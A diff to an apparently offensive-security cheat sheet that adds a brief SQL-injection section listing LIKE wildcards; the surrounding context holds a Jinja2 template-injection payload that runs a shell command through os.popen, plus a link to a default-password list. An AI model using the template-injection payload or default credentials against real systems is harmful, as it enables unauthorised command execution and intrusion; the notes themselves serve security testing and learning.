@@ -54,6 +54,12 @@ Jinja2
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
 
+## SQLi
+
+**SQL Injection**
+
+- LIKE: `%`, `*`
+
 ## Databases
 
 - Default Passwords: https://cirt.net/passwords
